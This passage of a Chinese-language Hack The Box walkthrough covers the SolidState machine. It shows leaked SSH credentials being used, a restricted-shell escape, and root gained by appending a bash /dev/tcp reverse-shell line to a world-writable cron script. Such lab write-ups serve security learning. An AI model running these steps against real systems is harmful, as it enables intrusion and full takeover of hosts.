Remember to reset your password after your first login. </span><br><span class="line">Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. </span><br><span class="line"></span><br><span class="line">username: mindy</span><br><span class="line">pass: P@55W0rd1!2@</span><br><span class="line"></span><br><span class="line">Respectfully,</span><br><span class="line">James</span><br><span class="line"></span><br><span class="line">.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以被用来登录ssh，但是是限制级的shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Message-ID: &lt;8375593.0.1661772097524.JavaMail.root@solidstate&gt;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=us-ascii</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost</span><br><span class="line">Received: from 10.10.14.18 ([10.10.14.18])</span><br><span class="line">          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 632</span><br><span class="line">          <span class="keyword">for</span> &lt;../../../../../../../../etc/bash_completion.d@localhost&gt;;</span><br><span class="line">          Mon, 29 Aug 2022 07:20:57 -0400 (EDT)</span><br><span class="line">Date: Mon, 29 Aug 2022 07:20:57 -0400 (EDT)</span><br><span class="line">From: team@team.pl</span><br><span class="line"></span><br><span class="line">: No such file or directory</span><br><span class="line">-rbash: $<span class="string">&#x27;\r&#x27;</span>: <span class="built_in">command</span> not found</span><br><span class="line">mindy@solidstate:~$ </span><br></pre></td></tr></table></figure>
+
+<p>很好绕：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CrazyInSide:~/HackTheBox$ sshpass -p <span class="string">&#x27;P@55W0rd1!2@&#x27;</span> ssh mindy@10.10.10.51 -t bash</span><br><span class="line"><span class="variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:~$ <span class="built_in">ls</span></span><br><span class="line">bin  user.txt</span><br><span class="line"><span class="variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(mindy) gid=1001(mindy) <span class="built_in">groups</span>=1001(mindy)</span><br><span class="line"><span class="variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">839631b6a847fb2415f9764adb415a7b</span><br><span class="line"><span class="variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:~$ </span><br></pre></td></tr></table></figure>
+
+<p>在&#x2F;opt&#x2F;下有一个计划任务脚本，root会定时的去运行该脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:/opt$ <span class="built_in">ls</span></span><br><span class="line">james-2.3.2  tmp.py</span><br><span class="line"><span class="variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:/opt$ <span class="built_in">cat</span> tmp.py </span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">     os.system(<span class="string">&#x27;nc 10.10.14.18 4242&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">     sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:/opt$ <span class="built_in">ls</span> -all tmp.py </span><br><span class="line">-rwxrwxrwx 1 root root 111 Aug 29 09:35 tmp.py</span><br><span class="line"><span class="variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:/opt$ </span><br></pre></td></tr></table></figure>
+
+<p>并且该脚本是可写的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:/opt$ <span class="built_in">echo</span> <span class="string">&quot;os.system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.4/1337 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&gt;&gt;tmp.py </span><br><span class="line"><span class="variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>mindy@solidstate:/opt$ <span class="built_in">cat</span> tmp.py </span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">     os.system(<span class="string">&#x27;nc 10.10.14.18 4242&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">     sys.exit()</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.4/1337 0&gt;&amp;1&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CrazyInSide:~/HackTheBox$ nc -lvnp 1337           </span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">connect to [10.10.16.4] from (UNKNOWN) [10.10.10.51] 57460</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (6567): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@solidstate:~<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@solidstate:~<span class="comment"># cat root.txt</span></span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">ad68d5.............................</span><br><span class="line">root@solidstate:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - SolidState</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-SolidState.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>CrazyInSide</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-SteamCloud.html" title="HTB Walkthrough - SteamCloud">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - SteamCloud</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Shocker.html" title="HTB Walkthrough - shocker">
+                        <span class="hidden-mobile">HTB Walkthrough - shocker</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
